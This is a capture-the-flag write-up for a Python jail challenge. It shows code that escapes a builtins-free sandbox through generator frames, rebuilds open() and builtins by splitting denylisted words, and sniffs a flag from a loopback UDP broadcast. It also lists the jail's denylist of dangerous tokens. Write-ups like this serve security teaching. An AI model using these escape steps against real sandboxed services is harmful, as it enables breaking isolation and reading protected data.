# Operation Dawn: The Fire-Control Terminal

> Misc · Easy · Terminal43  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{AndAJ0TTZiiPTYMu9FmX2yy7}`

(Per-team random, 24-char body — the value above is the one captured against the assigned instance in this session.)

**Challenge**

> Operation Dawn, annex entry 13. We seized an Ash fire-control terminal intact and kept its console live. The console is locked down to a handful of operator expressions, but the command relay into it was never cut — orders are still arriving over it. Get onto the terminal and take down the standing order the relay keeps repeating.

The challenge ships **no files**: it is a live TCP console only, reached over the `docker_per_team` plugin API (`POST /containers/api/{request,view_info,...}` with `{"chal_id": 9124}`, capabilities `SETUID,SETGID,KILL`). Because there is no handout, the jail's own source was recovered in-band from the running instance once the escape below gave an output channel, and the exploit was developed directly against the assigned per-team instance. The brief maps straight onto the mechanism: the "console locked to a handful of operator expressions" is a restricted Python expression jail, and the "command relay that keeps repeating a standing order" is a separate process broadcasting the flag that has to be intercepted from inside the container.

Connecting shows a banner (`ASH ARMY // RESTRICTED // OPERATION DAWN`, `FIRE-CONTROL CONSOLE`) and a `>>>` prompt.

**Approach / walkthrough**

1. **Probe the console.** Each line is run as `exec(compile(src, '<console>', 'exec'), env, env)` with `env = {'__builtins__': {}}`; state persists for the connection. Results are never echoed — the only responses are silence (ran OK), `ERROR :: expression faulted` (an exception), or `DENIED :: expression not authorised on this console` (denylist hit). Literals, assignments, tuples, lambdas, generator expressions, attribute access and method calls all work; bare names like `len`/`chr`/`type` raise `NameError`, confirming no builtins in scope. A substring denylist on `src.lower()` rejects the whole input if any of `import eval exec compile breakpoint class bases base subclasses subclass globals builtins getattr setattr mro input open read system popen` appears. Crucially the *singular* forms `global`/`builtin` and the tokens `write`/`print`/`os`/`sys`/`frame`/`back`/`code`/`func`/`self` are allowed, and the filter is purely textual — so `'__buil'+'tins__'` and `'op'+'en'` slip past.

2. **Escape via frames.** Because `__class__`/`.mro`/`.__bases__`/`.__subclasses__` are all blocked, the usual class-hierarchy walk is closed. The surviving primitive is execution frames. A generator carries a reference to its own frame via `gi_frame`, and `f_back` chains up the call stack. A self-referential generator expression, forced by unpacking inside the eval frame, yields the running frame:

   ```python
   g = (g.gi_frame.f_back for _ in (1,))   # self-referential genexp
   F = (*g,)[0]                            # consume via unpack -> F is the <console> eval frame
   ```

   `F.f_globals` is unusable (`globals` is on the denylist), but `F.f_locals` is **not** filtered. Walking back up the C-level call chain reaches the `jail.py` module globals as a locals dict:

   ```python
   G = F.f_back.f_back.f_back.f_locals     # jail.py module-level namespace
   ```

3. **Regain real builtins and an in-band channel.** From those globals, recover the real builtins and `open`, splitting the forbidden literals to dodge the substring filter:

   ```python
   B = G['__buil'+'tins__']                # the real builtins module
   P = B.__dict__['op'+'en']               # real open()
   ```

   Since results are never echoed, blind ERROR-oracle byte-grinding was the planned fallback but was not needed: the request-handler frame holds the write stream for our own connection, so grabbing it turns the blind jail into a plaintext shell:

   ```python
   W = F.f_back.f_locals['wf']             # handler's write file -> our socket; W.write(x) prints back
   ```

4. **Locate the secret (it is not in the jail process).** Dumping recon with `W.write`: the jail process environment has `JAIL_PORT` and `DISPATCH_PORT=49513` but no `FLAG`; `/opt/jail.py` holds no flag; `/proc` shows (besides container init at pid 1) `init.py` (root), `sender.py` (uid 1001), and `jail.py` (uid 1000, us). `/opt/init.py` keeps the `FLAG` as root, pipes it on stdin to the relay (`sender.py`), and spawns children with the variable stripped from their environment. As uid 1000 we cannot read root's or uid 1001's memory, so the flag has to be taken in flight — exactly as the brief ("the command relay keeps repeating") says.

5. **Read the relay.** `/opt/sender.py` broadcasts the flag once a second as a UDP datagram to a fixed high loopback port (`DISPATCH_PORT` = 49513 on this instance, `127.0.0.1:49513`), base64url-encoded, prefixed with a `FIRE MISSION AUTH CODE ` string. The console and relay share the container network namespace, so loopback is shared. Binding that UDP port from inside the console and receiving one datagram captures the order:

   ```python
   U = SK.socket(SK.AF_INET, SK.SOCK_DGRAM)
   U.bind(('127.0.0.1', 49513))
   data = U.recvfrom(1024)                 # then W.write(data) back to us
   ```

   Captured payload:

   ```
   ASH CMD RELAY // ... FIRE MISSION AUTH CODE Q1NDVEZ7QW5kQUowVFRaaWlQVFlNdTlGbVgyeXk3fQ==
   ```

   Base64url-decoding the auth code:

   ```bash
   echo -n 'Q1NDVEZ7QW5kQUowVFRaaWlQVFlNdTlGbVgyeXk3fQ==' | base64 -d
   # -> CSCTF{AndAJ0TTZiiPTYMu9FmX2yy7}
   ```

**Why it works**

The jail relies on a string denylist and empty builtins, but Python frame objects expose `f_locals` of every calling frame, and `f_locals` was not on the denylist (unlike `f_globals`). That single gap leaks the module globals, from which the real builtins are reassembled by splitting the forbidden names across string concatenation. The flag itself never lives in the jail process; it is continuously re-broadcast by a sibling process on the shared loopback interface, so it is read in-band on the container's own loopback rather than exfiltrated — important because challenge containers have no egress.

**Validation / reproduction**

There was no handout; the whole chain ran against the assigned per-team instance. The frame escape and in-band channel were confirmed live (the jail's source, read back over the console, matched the observed accept/`ERROR`/`DENIED` behavior), and because the flag never lives in the jail process the loopback UDP datagram was captured and base64url-decoded to a well-formed `CSCTF{...}` string. Accepted on the first submission (`tried.json`: one attempt, status `correct`). All work stayed on the squad's assigned instance — no platform endpoints, other teams, or unassigned instances were touched, no scanning, no brute-forcing.

Reproduction, on one connection to the console: build the frame handles (`g`/`F`/`G`/`B`/`P`/`W`) as above; obtain a `socket` module handle (the likely route is `B.__dict__['__imp'+'ort__']('socket')`, splitting the `import` token — the exact line that bound `SK` was not kept in the saved transcript); confirm `DISPATCH_PORT=49513` from the environment; bind UDP `127.0.0.1:49513`, `recvfrom`, and `W.write` the datagram back; base64url-decode the `FIRE MISSION AUTH CODE` field.
